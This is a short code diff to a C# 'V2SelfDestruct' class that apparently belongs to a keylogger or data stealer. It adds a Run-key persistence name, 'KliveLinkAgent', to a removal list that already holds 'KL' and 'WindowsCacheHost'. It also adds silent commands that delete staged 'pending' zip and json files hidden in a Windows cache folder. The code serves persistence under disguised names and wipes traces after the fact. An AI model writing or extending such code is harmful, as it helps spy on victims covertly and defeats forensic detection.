@@ -19,7 +19,7 @@ public static class V2SelfDestruct
                 {
                     using RegistryKey? key = Registry.CurrentUser.OpenSubKey(
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
-                    foreach (string name in new[] { "KL", "WindowsCacheHost" })
+                    foreach (string name in new[] { "KL", "WindowsCacheHost", "KliveLinkAgent" })
                     {
                         if (key?.GetValue(name) != null)
                         {
@@ -75,6 +75,10 @@ public static class V2SelfDestruct
                   "timeout /t 2 /nobreak >nul\r\n" +
                   "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v KL /f >nul 2>&1\r\n" +
                   "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCacheHost /f >nul 2>&1\r\n" +
+                  "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v KliveLinkAgent /f >nul 2>&1\r\n" +
+                  "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.pending.zip\" >nul 2>&1\r\n" +
+                  "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.pending.json\" >nul 2>&1\r\n" +
+                  "del /f /q \"%LOCALAPPDATA%\\Microsoft\\Windows\\Caches\\k.*.auto.json\" >nul 2>&1\r\n" +
                   $"rmdir /s /q \"{dir}\" >nul 2>&1\r\n" +
                   $"del /f /q \"{temp}\" >nul 2>&1\r\n"
                 : "#!/bin/sh\n" +
